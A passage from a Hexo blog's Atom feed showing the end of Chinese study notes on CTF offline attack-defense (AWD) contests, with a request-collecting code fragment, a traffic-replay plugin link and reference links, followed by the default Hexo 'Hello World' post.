new_url)</span><br><span class="line">                              all_requests.append(request)</span><br><span class="line">    <span class="keyword">return</span> all_requests </span><br></pre></td></tr></table></figure><h4 id="流量复用"><a href="#流量复用" class="headerlink" title="流量复用"></a>流量复用</h4><p><a href="http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar">http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar</a></p><h2 id="参考网站："><a href="#参考网站：" class="headerlink" title="参考网站："></a>参考网站：</h2><p><a href="http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/">http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/</a></p><p><a href="https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/">https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctf线下AWD攻防赛学习笔记&quot;&gt;&lt;a href=&quot;#ctf线下AWD攻防赛学习笔记&quot; class=&quot;headerlink&quot; title=&quot;ctf线下AWD攻防赛学习笔记&quot;&gt;&lt;/a&gt;ctf线下AWD攻防赛学习笔记&lt;/h1&gt;&lt;p&gt;CTF线下攻防赛主要以攻防模式（At</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="攻防" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/08/07/hello-world/"/>
    <id>http://example.com/2022/08/07/hello-world/</id>
    <published>2022-08-07T00:32:08.000Z</published>
    <updated>2022-09-09T05:01:57.431Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
    <category term="intro" scheme="http://example.com/tags/intro/"/>
    
  </entry>
  
</feed>
